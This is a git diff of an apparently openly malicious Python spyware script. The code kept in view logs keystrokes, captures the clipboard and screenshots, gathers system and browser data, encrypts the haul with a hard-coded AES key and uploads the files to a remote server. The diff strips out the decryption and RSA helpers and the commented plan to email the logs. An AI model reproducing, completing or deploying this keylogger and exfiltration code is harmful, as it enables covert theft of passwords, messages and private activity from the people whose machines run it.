@@ -1,57 +1,8 @@
-import socket
-import time
-import os
-import platform
-import subprocess
-import psutil
-import threading
-import clipboard
-import pyautogui
-import sqlite3
+import socket, time, datetime, os, platform, subprocess, psutil, threading, clipboard, pyautogui, sqlite3
+import tarfile, requests, hashlib
 from pynput import keyboard
-import datetime
-from cryptography.hazmat.primitives.asymmetric import rsa, padding
-from cryptography.hazmat.primitives import serialization, hashes
 from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
 from cryptography.hazmat.backends import default_backend
-import requests
-import base64
-import hashlib
-import shutil
-import tarfile
-
-# Load or generate RSA keys
-def generate_keys():
-    private_key = rsa.generate_private_key(
-        public_exponent=65537,
-        key_size=2048,
-        backend=default_backend()
-    )
-    public_key = private_key.public_key()
-    return private_key, public_key
-
-def load_public_key(pem_data):
-    return serialization.load_pem_public_key(pem_data, backend=default_backend())
-
-def encrypt_data(data, public_key):
-    return public_key.encrypt(
-        data,
-        padding.OAEP(
-            mgf=padding.MGF1(algorithm=hashes.SHA256()),
-            algorithm=hashes.SHA256(),
-            label=None
-        )
-    )
-
-def decrypt_data(encrypted_data, private_key):
-    return private_key.decrypt(
-        encrypted_data,
-        padding.OAEP(
-            mgf=padding.MGF1(algorithm=hashes.SHA256()),
-            algorithm=hashes.SHA256(),
-            label=None
-        )
-    )
 
 def symmetric_encrypt(data, key):
     iv = os.urandom(16)
@@ -59,24 +10,11 @@ def symmetric_encrypt(data, key):
     encryptor = cipher.encryptor()
     return iv + encryptor.update(data) + encryptor.finalize()
 
-def symmetric_decrypt(encrypted_data, key):
-    iv = encrypted_data[:16]
-    cipher = Cipher(algorithms.AES(key), modes.CFB(iv), backend=default_backend())
-    decryptor = cipher.decryptor()
-    return decryptor.update(encrypted_data[16:]) + decryptor.finalize()
-
 def send_file(file_path, url):
     with open(file_path, 'rb') as f:
         files = {'file': f}
         response = requests.post(url, files=files)
         print(f"Sent {file_path}, response: {response.status_code}")
-
-# Save keys to files or load existing keys
-private_key, public_key = generate_keys()
-public_key_pem = public_key.public_bytes(
-    encoding=serialization.Encoding.PEM,
-    format=serialization.PublicFormat.SubjectPublicKeyInfo
-)
 
 # Symmetric key for local encryption
 symmetric_key = hashlib.sha256(b"this_is_a_secret_key").digest()
@@ -312,34 +250,6 @@ def encrypt_screenshots_folder():
     
     os.remove(tar_file)
 
-def decrypt_files():
-    files_to_decrypt = ["system_info.txt.enc", "connected_devices.txt.enc", "network_info.txt.enc", "browser_history.txt.enc", "keylogger.txt.enc", "keylogger_letters.txt.enc", "clipboard.txt.enc"]
-    for file in files_to_decrypt:
-        try:
-            with open(file, "rb") as f:
-                encrypted_data = f.read()
-            data = symmetric_decrypt(encrypted_data, symmetric_key)
-            with open(file[:-4], "wb") as f:
-                f.write(data)
-            os.remove(file)
-        except FileNotFoundError:
-            continue
-
-def decrypt_screenshots_folder():
-    tar_file = "screenshots.tar.gz.enc"
-    
-    with open(tar_file, "rb") as f:
-        encrypted_data = f.read()
-    
-    data = symmetric_decrypt(encrypted_data, symmetric_key)
-    
-    with open("screenshots.tar.gz", "wb") as f:
-        f.write(data)
-    
-    with tarfile.open("screenshots.tar.gz", "r:gz") as tar:
-        tar.extractall()
-    
-    os.remove("screenshots.tar.gz")
 
 # Function to send encrypted files to a remote server
 def send_files_to_server():
@@ -386,37 +296,3 @@ try:
 finally:
     keylogger_listener.stop()
     print("Keylogger stopped.")
-
-
-# Call the function to gather browser history
-# The gather_browser_history function is trying to get the browser history by using the tasklist command. However, the tasklist command does not provide browser history. It only lists the currently running tasks or services in your system.
-# If you want to gather browser history, you would need to access the SQLite databases that browsers like Chrome and Firefox use to store history data. This is a complex task and involves understanding the database schema used by each browser. Also, it's important to note that accessing browser history without user consent can be a violation of privacy.
-# Here's a simplified example of how you might access Chrome's history (this will only work if Chrome is not currently running, as the database will be locked otherwise). This code opens the history SQLite database that Chrome uses to store browsing history, and writes each URL to a file. Note that this is a simplified example and may not work in all cases, especially if the user has multiple Chrome profiles or if the database schema changes in a future Chrome update
-
-
-#Scope of improvements:
-# 1. Add a feature to send the all contents to email
-# 2. Combination of keystrokes with ctrl, alt is not handled properly 
-# 3. Numeric numbers on numpad can be capruted properly
-
-
-
-#Email part
- # if currentTime > stoppingTime:
-    #     # Send keylogger contents to email
-    #     send_email(keys_information, file_path + extend + keys_information)
-    #     # Clear contens of keylogger log file.
-    #     with open("keylogger.txt", "w") as f:
-    #         f.write(" ")
-    #     # Take a screenshot and send to email
-    #     screenshot()
-    #     send_email(screenshot_information, file_path + extend + screenshot_information)
-    #     # Gather clipboard contents and send to email
-    #     copy_clipboard()
-    #     send_email(clipboard_information, file_path + extend + clipboard_information)
-
-    #     # Increase iteration by 1
-    #     number_of_iterations += 1
-    #     # Update current time
-    #     currentTime = time.time()
-    #     stoppingTime = time.time() + time_iteration
